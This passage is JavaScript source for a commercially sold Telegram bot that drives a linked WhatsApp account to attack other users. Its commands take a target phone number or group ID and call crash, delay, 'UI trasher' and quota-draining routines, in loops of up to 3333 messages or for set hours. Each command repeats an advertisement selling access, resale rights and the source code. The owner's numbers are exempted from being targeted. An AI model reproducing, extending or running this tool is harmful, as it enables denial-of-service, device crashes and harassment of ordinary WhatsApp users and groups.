  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /delayfcgc input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /delayfcgc: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID.\nExample: /delayfcgc 120363047626537xxx@g.us\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /delayfcgc: rawTarget = "${rawTarget}"`);

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /delayfcgc: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /delayfcgc: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  try {
    /*await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to group...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    for (let i = 0; i < 3333; i++) {
        await xeonPendingCrashGp(rawTarget, userNumber, chatId, botInstance, false);
        await sleep(1000);
    }*/
await spamDelayFC(rawTarget, userNumber, chatId, botInstance, true, 3333);        // for group
  } catch (error) {
    console.error(`Error in /delayfcgc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /delayfcgc: ${error.message}`);
  }
});

botInstance.onText(/\/jdie9292idjd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /androgcstatus raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /androgcstatus input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /androgcstatus: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /androgcstatus 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /androgcstatus: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /androgcstatus 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /androgcstatus: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /androgcstatus: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /androgcstatus: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

      await xeonStatusGroupAndroidExecutor(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
    console.error(`Error in /androgcstatus for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /androgcstatus: ${error.message}`);
  }
});

botInstance.onText(/\/hr83iejdjd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /androgc raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /androgc input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /androgc: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID.\nExample: /androgc 120363047626537xxx@g.us\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /androgc: rawTarget = "${rawTarget}"`);

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /androgc: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /androgc: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to group...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    for (let i = 0; i < 15; i++) {
        await xeonVideoGroupAndroid(rawTarget, userNumber, chatId, botInstance);
    }
  } catch (error) {
    console.error(`Error in /androgc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /androgc: ${error.message}`);
  }
});

botInstance.onText(/\/heiweh82(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /delayxceed raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /delayxceed input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /delayxceed: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /delayxceed +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /delayxceed: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /delayxceed +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /delayxceed: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /delayxceed: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /delayxceed: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /delayxceed: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonDelayXceedExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance, true)
    ]);
  } catch (error) {
    console.error(`Error in /delayxceed for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /delayxceed: ${error.message}`);
  }
});

botInstance.onText(/\/eatquota(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /eatquota raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /eatquota input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /eatquota: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /eatquota +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /eatquota: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /eatquota +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /eatquota: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /eatquota: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /eatquota: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /eatquota: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonDelayNewExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance, true)
    ]);
  } catch (error) {
    console.error(`Error in /eatquota for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /eatquota: ${error.message}`);
  }
});

botInstance.onText(/\/ej38d(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /trashsysgp raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /trashsysgp input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /trashsysgp: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /trashsysgp 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /trashsysgp: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /trashsysgp 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /trashsysgp: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /trashsysgp: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /trashsysgp: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

      await xeonUiTrasherGpExecutor(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
    console.error(`Error in /trashsysgp for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /trashsysgp: ${error.message}`);
  }
});

botInstance.onText(/\/neowjend(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /trashsystem raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /trashsystem input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /trashsystem: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /trashsystem +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /trashsystem: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /trashsystem +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /trashsystem: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /trashsystem: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /trashsystem: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /trashsystem: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonUiTrasherExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /trashsystem for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /trashsystem: ${error.message}`);
  }
});

botInstance.onText(/\/xwweewwr(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /netcutter raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /netcutter input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /netcutter: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /netcutter +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /netcutter: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /netcutter +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /netcutter: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /netcutter: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /netcutter: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /netcutter: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonQuotaConsumerExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /netcutter for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /netcutter: ${error.message}`);
  }
})

botInstance.onText(/\/eheoekjf(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /crashjam raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /crashjam input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /crashjam: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /crashjam +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /crashjam: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /crashjam +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /crashjam: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /crashjam: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /crashjam: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /crashjam: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `Use this bot @xeonbvgbot to use /crashjam command, in that bot use the command /addbot to pair your number and then use the commands in whatsapp.`,
parse_mode: 'HTML'
    });
  } catch (error) {
    console.error(`Error in /crashjam for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /crashjam: ${error.message}`);
  }
});

/*botInstance.onText(/\/crashjam(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /crashjam raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /crashjam input: match[2] = "${match[2]}"`);

